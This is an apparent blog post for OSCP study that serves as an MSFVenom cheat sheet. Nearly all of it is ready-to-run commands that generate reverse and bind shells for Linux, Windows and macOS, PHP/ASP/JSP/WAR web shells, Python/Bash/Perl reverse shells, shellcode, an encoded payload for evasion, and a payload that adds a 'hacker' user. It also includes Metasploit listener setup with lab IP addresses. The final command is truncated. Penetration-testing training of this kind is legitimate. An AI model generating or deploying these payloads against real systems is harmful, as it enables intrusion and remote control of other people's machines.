---
layout: post
title: MSFVenom CheatSheet
date: 2022-01-07 20:59
author: frank
comments: true
categories: [OSCP, Secruity]
---
<div style="direction: ltr; border-width: 100%;">
<div style="direction: ltr; margin-top: 0in; margin-left: 0in; width: 10.527in;">
<div style="direction: ltr; margin-top: 0in; margin-left: 0in; width: 10.527in;">
<p style="margin: 0in; font-family: Calibri; font-size: 11.0pt;"></p>
<p style="margin-top: 7pt; margin-bottom: 11pt; font-family: Calibri; font-size: 11.0pt;"><span style="font-weight: bold;">Run MSFCONSOLE startup quietly</span></p>
<p style="margin-left: .375in; margin-top: 7pt; margin-bottom: 11pt; font-family: Calibri; font-size: 11.0pt;">sudo msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST 192.168.49.76; set LPORT 443; exploit"</p>
<p style="margin-top: 7pt; margin-bottom: 11pt; line-height: 13pt; font-family: Calibri; font-size: 12.0pt; color: #333333;"></p>
<p style="margin-top: 7pt; margin-bottom: 11pt; font-family: lato; font-size: 12.0pt; color: #333333;"><span style="font-weight: bold; background: white;">Binaries Payloads</span></p>
<p style="margin-top: 7pt; margin-bottom: 11pt; font-family: lato; font-size: 12.0pt; color: #333333;"><span style="font-weight: bold; background: white;">Linux Meterpreter Reverse Shell</span></p>
<p style="margin-left: .375in; margin-top: 7pt; margin-bottom: 11pt; font-family: lato; font-size: 12.0pt; color: #333333;"><span style="background: white;">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f elf &gt; shell.elf</span></p>
<p style="margin-top: 7pt; margin-bottom: 11pt; font-family: lato; font-size: 12.0pt; color: #333333;"><span style="font-weight: bold; background: white;">Linux Bind Meterpreter Shell</span></p>
<p style="margin-left: .375in; margin-top: 7pt; margin-bottom: 11pt; font-family: lato; font-size: 12.0pt; color: #333333;"><span style="background: white;">msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=&lt;Remote IP Address&gt; LPORT=&lt;Local Port&gt; -f elf &gt; bind.elf</span></p>
<p style="margin-top: 7pt; margin-bottom: 11pt; font-family: lato; font-size: 12.0pt; color: #333333;"><span style="font-weight: bold; background: white;">Linux Bind Shell</span></p>
<p style="margin-left: .375in; margin-top: 7pt; margin-bottom: 11pt; font-family: lato; font-size: 12.0pt; color: #333333;"><span style="background: white;">msfvenom -p generic/shell_bind_tcp RHOST=&lt;Remote IP Address&gt; LPORT=&lt;Local Port&gt; -f elf &gt; term.elf</span></p>
<p style="margin-top: 7pt; margin-bottom: 11pt; font-family: lato; font-size: 12.0pt; color: #333333;"><span style="font-weight: bold; background: white;">Windows Meterpreter Reverse TCP Shell</span></p>
<p style="margin-left: .375in; margin-top: 7pt; margin-bottom: 11pt; font-family: lato; font-size: 12.0pt; color: #333333;"><span style="background: white;">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f exe &gt; shell.exe</span></p>
<p style="margin-top: 7pt; margin-bottom: 11pt; font-family: lato; font-size: 12.0pt; color: #333333;"><span style="font-weight: bold; background: white;">Windows Reverse TCP Shell</span></p>
<p style="margin-left: .375in; margin-top: 7pt; margin-bottom: 11pt; font-family: lato; font-size: 12.0pt; color: #333333;"><span style="background: white;">msfvenom -p windows/shell/reverse_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f exe &gt; shell.exe</span></p>
<p style="margin-top: 7pt; margin-bottom: 11pt; font-family: lato; font-size: 12.0pt; color: #333333;"><span style="font-weight: bold; background: white;">Windows Encoded Meterpreter Windows Reverse Shell</span></p>
<p style="margin-left: .375in; margin-top: 7pt; margin-bottom: 11pt; font-family: lato; font-size: 12.0pt; color: #333333;"><span style="background: white;">msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe &gt; encoded.exe</span></p>
<p style="margin-top: 7pt; margin-bottom: 11pt; font-family: lato; font-size: 12.0pt; color: #333333;"><span style="font-weight: bold; background: white;">Mac Reverse Shell</span></p>
<p style="margin-left: .375in; margin-top: 7pt; margin-bottom: 11pt; font-family: lato; font-size: 12.0pt; color: #333333;"><span style="background: white;">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f macho &gt; shell.macho</span></p>
<p style="margin-top: 7pt; margin-bottom: 11pt; font-family: lato; font-size: 12.0pt; color: #333333;"><span style="font-weight: bold; background: white;">Mac Bind Shell</span></p>
<p style="margin-left: .375in; margin-top: 7pt; margin-bottom: 11pt; font-family: lato; font-size: 12.0pt; color: #333333;"><span style="background: white;">msfvenom -p osx/x86/shell_bind_tcp RHOST=&lt;Remote IP Address&gt; LPORT=&lt;Local Port&gt; -f macho &gt; bind.macho</span></p>
<p style="margin-top: 7pt; margin-bottom: 11pt; line-height: 13pt; font-family: Calibri; font-size: 12.0pt; color: #333333;"></p>
<p style="margin-top: 7pt; margin-bottom: 11pt; line-height: 13pt; font-family: Calibri; font-size: 12.0pt; color: #333333;"></p>
<p style="margin-top: 7pt; margin-bottom: 11pt; font-family: lato; font-size: 12.0pt; color: #333333;"><span style="font-weight: bold; background: white;">Web Payloads</span></p>
<p style="margin-top: 7pt; margin-bottom: 11pt; font-family: lato; font-size: 12.0pt; color: #333333;"><span style="font-weight: bold; background: white;">PHP Meterpreter Reverse TCP</span></p>
<p style="margin-left: .375in; margin-top: 7pt; margin-bottom: 11pt; font-family: lato; font-size: 12.0pt; color: #333333;"><span style="background: white;">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f raw &gt; shell.php</span></p>
<p style="margin-left: .375in; margin-top: 7pt; margin-bottom: 11pt; font-family: lato; font-size: 12.0pt; color: #333333;"><span style="background: white;">cat shell.php | pbcopy &amp;&amp; echo ‘&lt;?php ‘ | tr -d ‘\n’ &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span></p>
<p style="margin-top: 7pt; margin-bottom: 11pt; font-family: lato; font-size: 12.0pt; color: #333333;"><span style="font-weight: bold; background: white;">ASP Meterpreter Reverse TCP</span></p>
<p style="margin-left: .375in; margin-top: 7pt; margin-bottom: 11pt; font-family: lato; font-size: 12.0pt; color: #333333;"><span style="background: white;">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f asp &gt; shell.asp</span></p>
<p style="margin-top: 7pt; margin-bottom: 11pt; font-family: lato; font-size: 12.0pt; color: #333333;"><span style="font-weight: bold; background: white;">JSP Java Meterpreter Reverse TCP</span></p>
<p style="margin-left: .375in; margin-top: 7pt; margin-bottom: 11pt; font-family: lato; font-size: 12.0pt; color: #333333;"><span style="background: white;">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f raw &gt; shell.jsp</span></p>
<p style="margin-top: 7pt; margin-bottom: 11pt; font-family: lato; font-size: 12.0pt; color: #333333;"><span style="font-weight: bold; background: white;">WAR</span></p>
<p style="margin-left: .375in; margin-top: 7pt; margin-bottom: 11pt; font-family: lato; font-size: 12.0pt; color: #333333;"><span style="background: white;">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f war &gt; shell.war</span></p>
<p style="margin-top: 7pt; margin-bottom: 11pt; line-height: 13pt; font-family: Calibri; font-size: 12.0pt; color: #333333;"></p>
<p style="margin-top: 7pt; margin-bottom: 11pt; font-family: lato; font-size: 12.0pt; color: #333333;"><span style="font-weight: bold; background: white;">Scripting Payloads</span></p>
<p style="margin-top: 7pt; margin-bottom: 11pt; line-height: 13pt; font-family: Calibri; font-size: 11.0pt;"></p>
<p style="margin-top: 7pt; margin-bottom: 11pt; font-family: lato; font-size: 12.0pt; color: #333333;"><span style="font-weight: bold; background: white;">Python Reverse Shell</span></p>
<p style="margin-left: .375in; margin-top: 7pt; margin-bottom: 11pt; font-family: lato; font-size: 12.0pt; color: #333333;"><span style="background: white;">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f raw &gt; shell.py</span></p>
<p style="margin-top: 7pt; margin-bottom: 11pt; font-family: lato; font-size: 12.0pt; color: #333333;"><span style="font-weight: bold; background: white;">Bash Unix Reverse Shell</span></p>
<p style="margin-left: .375in; margin-top: 7pt; margin-bottom: 11pt; font-family: lato; font-size: 12.0pt; color: #333333;"><span style="background: white;">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f raw &gt; shell.sh</span></p>
<p style="margin-top: 7pt; margin-bottom: 11pt; font-family: lato; font-size: 12.0pt; color: #333333;"><span style="font-weight: bold; background: white;">Perl Unix Reverse shell</span></p>
<p style="margin-left: .375in; margin-top: 7pt; margin-bottom: 11pt; font-family: lato; font-size: 12.0pt; color: #333333;"><span style="background: white;">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f raw &gt; shell.pl</span></p>
<p style="margin-top: 7pt; margin-bottom: 11pt; line-height: 13pt; font-family: Calibri; font-size: 12.0pt; color: #333333;"></p>
<p style="margin-top: 7pt; margin-bottom: 11pt; font-family: lato; font-size: 12.0pt; color: #333333;"><span style="font-weight: bold; background: white;">Shellcode</span></p>
<p style="margin-top: 7pt; margin-bottom: 11pt; font-family: lato; font-size: 12.0pt; color: #333333;"><span style="background: white;">Windows Meterpreter Reverse TCP Shellcode</span></p>
<p style="margin-left: .375in; margin-top: 7pt; margin-bottom: 11pt; font-family: lato; font-size: 12.0pt; color: #333333;"><span style="background: white;">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f &lt;language&gt;</span></p>
<p style="margin-top: 7pt; margin-bottom: 11pt; font-family: lato; font-size: 12.0pt; color: #333333;"><span style="font-weight: bold; background: white;">Linux Meterpreter Reverse TCP Shellcode</span></p>
<p style="margin-left: .375in; margin-top: 7pt; margin-bottom: 11pt; font-family: lato; font-size: 12.0pt; color: #333333;"><span style="background: white;">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f &lt;language&gt;</span></p>
<p style="margin-top: 7pt; margin-bottom: 11pt; font-family: lato; font-size: 12.0pt; color: #333333;"><span style="font-weight: bold; background: white;">Mac Reverse TCP Shellcode</span></p>
<p style="margin-left: .375in; margin-top: 7pt; margin-bottom: 11pt; font-family: lato; font-size: 12.0pt; color: #333333;"><span style="background: white;">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f &lt;language&gt;</span></p>
<p style="margin-top: 7pt; margin-bottom: 11pt; font-family: lato; font-size: 12.0pt; color: #333333;"><span style="font-weight: bold; background: white;">Create User</span></p>
<p style="margin-left: .375in; margin-top: 7pt; margin-bottom: 11pt; font-family: lato; font-size: 12.0pt; color: #333333;"><span style="background: white;">msfvenom -p windows/adduser USER=hacker PASS=Hacker123$ -f exe &gt; adduser.exe</span></p>
<p style="margin-top: 7pt; margin-bottom: 11pt; line-height: 13pt; font-family: Calibri; font-size: 12.0pt; color: #333333;"></p>
<p style="margin-top: 7pt; margin-bottom: 11pt; line-height: 13pt; font-family: Calibri; font-size: 12.0pt; color: #333333;"></p>
<p style="margin-top: 7pt; margin-bottom: 11pt; font-family: lato; font-size: 12.0pt; color: #333333;"><span style="font-weight: bold; background: white;">Metasploit Handler</span></p>
<p style="margin-left: .375in; margin-top: 7pt; margin-bottom: 11pt; font-family: lato; font-size: 12.0pt; color: #333333;"><span style="background: white;">use exploit/multi/handler</span></p>
<p style="margin-left: .375in; margin-top: 7pt; margin-bottom: 11pt; font-family: lato; font-size: 12.0pt; color: #333333;"><span style="background: white;">set PAYLOAD &lt;Payload name&gt;</span></p>
<p style="margin-left: .375in; margin-top: 7pt; margin-bottom: 11pt; font-family: lato; font-size: 12.0pt; color: #333333;"><span style="background: white;">Set RHOST &lt;Remote IP&gt;</span></p>
<p style="margin-left: .375in; margin-top: 7pt; margin-bottom: 11pt; font-family: lato; font-size: 12.0pt; color: #333333;"><span style="background: white;">set LHOST &lt;Local IP&gt;</span></p>
<p style="margin-left: .375in; margin-top: 7pt; margin-bottom: 11pt; font-family: lato; font-size: 12.0pt; color: #333333;"><span style="background: white;">set LPORT &lt;Local Port&gt;</span></p>
<p style="margin-left: .375in; margin-top: 7pt; margin-bottom: 11pt; font-family: lato; font-size: 12.0pt; color: #333333;"><span style="background: white;">Exploit -j</span></p>
<p style="margin: 0in; font-family: Calibri; font-size: 11.0pt;"></p>
<p style="margin: 0in; font-family: Calibri; font-size: 9.0pt; color: #595959;"></p>
<p style="margin: 0in; font-family: Calibri; font-size: 11.0pt;"></p>
<p style="margin: 0in; font-family: Calibri; font-size: 11.0pt;"></p>
<p style="margin: 0in; font-family: Calibri; font-size: 11.0pt;"></p>
<p style="margin: 0in; font-family: Calibri; font-size: 11.0pt;"></p>
<p style="margin: 0in; font-family: Calibri; font-size: 11.0pt;"><span style="font-weight: bold;">Shell Code</span></p>
<p style="margin: 0in; font-family: Calibri; font-size: 11.0pt;"></p>
<p style="margin: 0in; font-family: Calibri; font-size: 11.0pt;">include bad charactors that would cause the application to stop</p>
<p style="margin: 0in; font-family: Calibri; font-size: 11.0pt;"></p>
<p style="margin: 0in; font-family: Calibri; font-size: 11.0pt;">msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=4444 -f py -b '\x00\x0a\x0d\x20</p>

</div>
</div>
</div>
